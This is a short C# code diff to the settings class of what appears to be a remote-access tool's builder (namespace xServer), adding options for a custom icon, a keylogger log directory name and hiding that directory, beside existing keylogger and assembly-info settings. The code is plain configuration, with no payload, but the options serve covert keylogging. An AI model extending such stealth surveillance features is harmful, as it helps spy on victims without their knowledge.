@@ -167,6 +167,18 @@ namespace xServer.Core.Data
             }
         }
 
+        public string IconPath
+        {
+            get
+            {
+                return ReadValueSafe("IconPath");
+            }
+            set
+            {
+                WriteValue("IconPath", value);
+            }
+        }
+
         public bool ChangeAsmInfo
         {
             get
@@ -188,6 +200,30 @@ namespace xServer.Core.Data
             set
             {
                 WriteValue("Keylogger", value.ToString());
+            }
+        }
+
+        public string LogDirectoryName
+        {
+            get
+            {
+                return ReadValueSafe("LogDirectoryName", "Logs");
+            }
+            set
+            {
+                WriteValue("LogDirectoryName", value);
+            }
+        }
+
+        public bool HideLogDirectory
+        {
+            get
+            {
+                return bool.Parse(ReadValueSafe("HideLogDirectory", "False"));
+            }
+            set
+            {
+                WriteValue("HideLogDirectory", value.ToString());
             }
         }
 
